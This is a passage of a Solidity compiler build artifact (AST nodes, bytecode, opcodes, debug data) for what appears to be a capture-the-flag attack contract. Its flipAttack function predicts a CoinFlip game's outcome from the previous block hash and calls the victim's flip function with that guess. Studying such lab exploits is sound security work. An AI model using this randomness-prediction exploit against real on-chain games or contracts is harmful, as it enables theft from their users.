															"src": "1061:128:2",
															"statements": [
																{
																	"nativeSrc": "1076:15:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1076:15:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1090:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1090:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1080:6:2",
																			"nodeType": "YulTypedName",
																			"src": "1080:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1105:74:2",
																	"nodeType": "YulAssignment",
																	"src": "1105:74:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1151:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "1151:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1162:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "1162:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1147:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "1147:3:2"
																				},
																				"nativeSrc": "1147:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "1147:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1171:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "1171:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nativeSrc": "1115:31:2",
																			"nodeType": "YulIdentifier",
																			"src": "1115:31:2"
																		},
																		"nativeSrc": "1115:64:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1115:64:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "1105:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "1105:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nativeSrc": "845:351:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "892:9:2",
														"nodeType": "YulTypedName",
														"src": "892:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "903:7:2",
														"nodeType": "YulTypedName",
														"src": "903:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "915:6:2",
														"nodeType": "YulTypedName",
														"src": "915:6:2",
														"type": ""
													}
												],
												"src": "845:351:2"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "60806040527f8000000000000000000000000000000000000000000000000000000000000000600155348015610033575f5ffd5b506040516104a63803806104a6833981810160405281019061005591906100f8565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610123565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100c78261009e565b9050919050565b6100d7816100bd565b81146100e1575f5ffd5b50565b5f815190506100f2816100ce565b92915050565b5f6020828403121561010d5761010c61009a565b5b5f61011a848285016100e4565b91505092915050565b610376806101305f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c8063987a4e2614610038578063f32d251d14610042575b5f5ffd5b610040610060565b005b61004a610137565b60405161005791906101d5565b60405180910390f35b5f60014361006e9190610224565b405f1c90505f600154826100829190610284565b90505f60018214610093575f610096565b60015b90505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b81526004016100f191906102ce565b6020604051808303815f875af115801561010d573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101319190610315565b50505050565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61019d6101986101938461015b565b61017a565b61015b565b9050919050565b5f6101ae82610183565b9050919050565b5f6101bf826101a4565b9050919050565b6101cf816101b5565b82525050565b5f6020820190506101e85f8301846101c6565b92915050565b5f819050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61022e826101ee565b9150610239836101ee565b9250828203905081811115610251576102506101f7565b5b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61028e826101ee565b9150610299836101ee565b9250826102a9576102a8610257565b5b828204905092915050565b5f8115159050919050565b6102c8816102b4565b82525050565b5f6020820190506102e15f8301846102bf565b92915050565b5f5ffd5b6102f4816102b4565b81146102fe575f5ffd5b50565b5f8151905061030f816102eb565b92915050565b5f6020828403121561032a576103296102e7565b5b5f61033784828501610301565b9150509291505056fea264697066735822122095598535040f4d928b04f0b5f86d1082bbc27f747f86c751e11a79e9ce98f39664736f6c634300081b0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x33 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x4A6 CODESIZE SUB DUP1 PUSH2 0x4A6 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x55 SWAP2 SWAP1 PUSH2 0xF8 JUMP JUMPDEST DUP1 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x123 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xC7 DUP3 PUSH2 0x9E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xD7 DUP2 PUSH2 0xBD JUMP JUMPDEST DUP2 EQ PUSH2 0xE1 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xF2 DUP2 PUSH2 0xCE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x10D JUMPI PUSH2 0x10C PUSH2 0x9A JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x11A DUP5 DUP3 DUP6 ADD PUSH2 0xE4 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x376 DUP1 PUSH2 0x130 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x987A4E26 EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0xF32D251D EQ PUSH2 0x42 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x40 PUSH2 0x60 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4A PUSH2 0x137 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x57 SWAP2 SWAP1 PUSH2 0x1D5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH1 0x1 NUMBER PUSH2 0x6E SWAP2 SWAP1 PUSH2 0x224 JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP PUSH0 PUSH1 0x1 SLOAD DUP3 PUSH2 0x82 SWAP2 SWAP1 PUSH2 0x284 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ PUSH2 0x93 JUMPI PUSH0 PUSH2 0x96 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xF1 SWAP2 SWAP1 PUSH2 0x2CE JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x10D JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x131 SWAP2 SWAP1 PUSH2 0x315 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x19D PUSH2 0x198 PUSH2 0x193 DUP5 PUSH2 0x15B JUMP JUMPDEST PUSH2 0x17A JUMP JUMPDEST PUSH2 0x15B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1AE DUP3 PUSH2 0x183 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1BF DUP3 PUSH2 0x1A4 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1CF DUP2 PUSH2 0x1B5 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1E8 PUSH0 DUP4 ADD DUP5 PUSH2 0x1C6 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x22E DUP3 PUSH2 0x1EE JUMP JUMPDEST SWAP2 POP PUSH2 0x239 DUP4 PUSH2 0x1EE JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x251 JUMPI PUSH2 0x250 PUSH2 0x1F7 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x28E DUP3 PUSH2 0x1EE JUMP JUMPDEST SWAP2 POP PUSH2 0x299 DUP4 PUSH2 0x1EE JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x2A9 JUMPI PUSH2 0x2A8 PUSH2 0x257 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2C8 DUP2 PUSH2 0x2B4 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2E1 PUSH0 DUP4 ADD DUP5 PUSH2 0x2BF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x2F4 DUP2 PUSH2 0x2B4 JUMP JUMPDEST DUP2 EQ PUSH2 0x2FE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x30F DUP2 PUSH2 0x2EB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x32A JUMPI PUSH2 0x329 PUSH2 0x2E7 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x337 DUP5 DUP3 DUP6 ADD PUSH2 0x301 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP6 MSIZE DUP6 CALLDATALOAD DIV 0xF 0x4D SWAP3 DUP12 DIV CREATE 0xB5 0xF8 PUSH14 0x1082BBC27F747F86C751E11A79E9 0xCE SWAP9 RETURN SWAP7 PUSH5 0x736F6C6343 STOP ADDMOD SHL STOP CALLER ",
							"sourceMap": "91:513:1:-:0;;;175:77;158:94;;259:96;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;332:15;306:14;;:42;;;;;;;;;;;;;;;;;;259:96;91:513;;88:117:2;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;91:513:1:-;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@flipAttack_139": {
									"entryPoint": 96,
									"id": 139,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@victimContract_87": {
									"entryPoint": 311,
									"id": 87,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_decode_t_bool_fromMemory": {
									"entryPoint": 769,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_bool_fromMemory": {
									"entryPoint": 789,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_bool_to_t_bool_fromStack": {
									"entryPoint": 703,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_contract$_CoinFlip_$81_to_t_address_fromStack": {
									"entryPoint": 454,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed": {
									"entryPoint": 718,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_contract$_CoinFlip_$81__to_t_address__fromStack_reversed": {
									"entryPoint": 469,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"checked_div_t_uint256": {
									"entryPoint": 644,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint256": {
									"entryPoint": 548,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 692,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 347,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 494,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"convert_t_contract$_CoinFlip_$81_to_t_address": {
									"entryPoint": 437,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"convert_t_uint160_to_t_address": {
									"entryPoint": 420,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"convert_t_uint160_to_t_uint160": {
									"entryPoint": 387,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"identity": {
									"entryPoint": 378,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"panic_error_0x11": {
									"entryPoint": 503,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x12": {
									"entryPoint": 599,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 743,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_bool": {
									"entryPoint": 747,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:3270:2",
										"nodeType": "YulBlock",
										"src": "0:3270:2",
										"statements": [
											{
												"body": {
													"nativeSrc": "52:81:2",
													"nodeType": "YulBlock",
													"src": "52:81:2",
													"statements": [
														{
															"nativeSrc": "62:65:2",
															"nodeType": "YulAssignment",
															"src": "62:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "77:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "77:5:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "84:42:2",
																		"nodeType": "YulLiteral",
																		"src": "84:42:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nativeSrc": "73:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "73:3:2"
																},
																"nativeSrc": "73:54:2",
																"nodeType": "YulFunctionCall",
																"src": "73:54:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "62:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "62:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nativeSrc": "7:126:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "34:5:2",
														"nodeType": "YulTypedName",
														"src": "34:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "44:7:2",
														"nodeType": "YulTypedName",
														"src": "44:7:2",
														"type": ""
													}
												],
												"src": "7:126:2"
											},
											{
												"body": {
													"nativeSrc": "171:28:2",
													"nodeType": "YulBlock",
													"src": "171:28:2",
													"statements": [
														{
															"nativeSrc": "181:12:2",
															"nodeType": "YulAssignment",
															"src": "181:12:2",
															"value": {
																"name": "value",
																"nativeSrc": "188:5:2",
																"nodeType": "YulIdentifier",
																"src": "188:5:2"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nativeSrc": "181:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "181:3:2"
																}
															]
														}
													]
												},
												"name": "identity",
												"nativeSrc": "139:60:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "157:5:2",
														"nodeType": "YulTypedName",
														"src": "157:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "ret",
														"nativeSrc": "167:3:2",
														"nodeType": "YulTypedName",
														"src": "167:3:2",
														"type": ""
													}
												],
												"src": "139:60:2"
											},
											{
												"body": {
													"nativeSrc": "265:82:2",
													"nodeType": "YulBlock",
													"src": "265:82:2",
													"statements": [
														{
															"nativeSrc": "275:66:2",
															"nodeType": "YulAssignment",
															"src": "275:66:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "333:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "333:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_uint160",
																					"nativeSrc": "315:17:2",
																					"nodeType": "YulIdentifier",
																					"src": "315:17:2"
																				},
																				"nativeSrc": "315:24:2",
																				"nodeType": "YulFunctionCall",
																				"src": "315:24:2"
																			}
																		],
																		"functionName": {
																			"name": "identity",
																			"nativeSrc": "306:8:2",
																			"nodeType": "YulIdentifier",
																			"src": "306:8:2"
																		},
																		"nativeSrc": "306:34:2",
																		"nodeType": "YulFunctionCall",
																		"src": "306:34:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nativeSrc": "288:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "288:17:2"
																},
																"nativeSrc": "288:53:2",
																"nodeType": "YulFunctionCall",
																"src": "288:53:2"
															},
															"variableNames": [
																{
																	"name": "converted",
																	"nativeSrc": "275:9:2",
																	"nodeType": "YulIdentifier",
																	"src": "275:9:2"
																}
															]
														}
													]
												},
												"name": "convert_t_uint160_to_t_uint160",
												"nativeSrc": "205:142:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "245:5:2",
														"nodeType": "YulTypedName",
														"src": "245:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "converted",
														"nativeSrc": "255:9:2",
														"nodeType": "YulTypedName",
														"src": "255:9:2",
														"type": ""
													}
												],
												"src": "205:142:2"
											},
											{
												"body": {
													"nativeSrc": "413:66:2",
													"nodeType": "YulBlock",
													"src": "413:66:2",
													"statements": [
														{
															"nativeSrc": "423:50:2",
															"nodeType": "YulAssignment",
															"src": "423:50:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "467:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "467:5:2"
																	}
																],
																"functionName": {
																	"name": "convert_t_uint160_to_t_uint160",
																	"nativeSrc": "436:30:2",
																	"nodeType": "YulIdentifier",
																	"src": "436:30:2"
																},
																"nativeSrc": "436:37:2",
																"nodeType": "YulFunctionCall",
																"src": "436:37:2"
															},
															"variableNames": [
																{
																	"name": "converted",
																	"nativeSrc": "423:9:2",
																	"nodeType": "YulIdentifier",
																	"src": "423:9:2"
																}
															]
														}
													]
												},
												"name": "convert_t_uint160_to_t_address",
												"nativeSrc": "353:126:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "393:5:2",
														"nodeType": "YulTypedName",
														"src": "393:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "converted",
														"nativeSrc": "403:9:2",
														"nodeType": "YulTypedName",
														"src": "403:9:2",
														"type": ""
													}
												],
												"src": "353:126:2"
											},
											{
												"body": {
													"nativeSrc": "560:66:2",
													"nodeType": "YulBlock",
													"src": "560:66:2",
													"statements": [
														{
															"nativeSrc": "570:50:2",
															"nodeType": "YulAssignment",
															"src": "570:50:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "614:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "614:5:2"
																	}
																],
																"functionName": {
																	"name": "convert_t_uint160_to_t_address",
																	"nativeSrc": "583:30:2",
																	"nodeType": "YulIdentifier",
																	"src": "583:30:2"
																},
																"nativeSrc": "583:37:2",
																"nodeType": "YulFunctionCall",
																"src": "583:37:2"
															},
															"variableNames": [
																{
																	"name": "converted",
																	"nativeSrc": "570:9:2",
																	"nodeType": "YulIdentifier",
																	"src": "570:9:2"
																}
															]
														}
													]
												},
												"name": "convert_t_contract$_CoinFlip_$81_to_t_address",
												"nativeSrc": "485:141:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "540:5:2",
														"nodeType": "YulTypedName",
														"src": "540:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "converted",
														"nativeSrc": "550:9:2",
														"nodeType": "YulTypedName",
														"src": "550:9:2",
														"type": ""
													}
												],
												"src": "485:141:2"
											},
											{
												"body": {
													"nativeSrc": "712:81:2",
													"nodeType": "YulBlock",
													"src": "712:81:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "729:3:2",
																		"nodeType": "YulIdentifier",
																		"src": "729:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "780:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "780:5:2"
																			}
																		],
																		"functionName": {
																			"name": "convert_t_contract$_CoinFlip_$81_to_t_address",
																			"nativeSrc": "734:45:2",
																			"nodeType": "YulIdentifier",
																			"src": "734:45:2"
																		},
																		"nativeSrc": "734:52:2",
																		"nodeType": "YulFunctionCall",
																		"src": "734:52:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "722:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "722:6:2"
																},
																"nativeSrc": "722:65:2",
																"nodeType": "YulFunctionCall",
																"src": "722:65:2"
															},
															"nativeSrc": "722:65:2",
															"nodeType": "YulExpressionStatement",
															"src": "722:65:2"
														}
													]
												},
												"name": "abi_encode_t_contract$_CoinFlip_$81_to_t_address_fromStack",
												"nativeSrc": "632:161:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "700:5:2",
														"nodeType": "YulTypedName",
														"src": "700:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "707:3:2",
														"nodeType": "YulTypedName",
														"src": "707:3:2",
														"type": ""
													}
												],
												"src": "632:161:2"
											},
											{
												"body": {
													"nativeSrc": "912:139:2",
													"nodeType": "YulBlock",
													"src": "912:139:2",
													"statements": [
														{
															"nativeSrc": "922:26:2",
															"nodeType": "YulAssignment",
															"src": "922:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "934:9:2",
																		"nodeType": "YulIdentifier",
																		"src": "934:9:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "945:2:2",
																		"nodeType": "YulLiteral",
																		"src": "945:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "930:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "930:3:2"
																},
																"nativeSrc": "930:18:2",
																"nodeType": "YulFunctionCall",
																"src": "930:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "922:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "922:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "1017:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "1017:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "1030:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "1030:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "1041:1:2",
																				"nodeType": "YulLiteral",
																				"src": "1041:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "1026:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "1026:3:2"
																		},
																		"nativeSrc": "1026:17:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1026:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_contract$_CoinFlip_$81_to_t_address_fromStack",
																	"nativeSrc": "958:58:2",
																	"nodeType": "YulIdentifier",
																	"src": "958:58:2"
																},
																"nativeSrc": "958:86:2",
																"nodeType": "YulFunctionCall",
																"src": "958:86:2"
															},
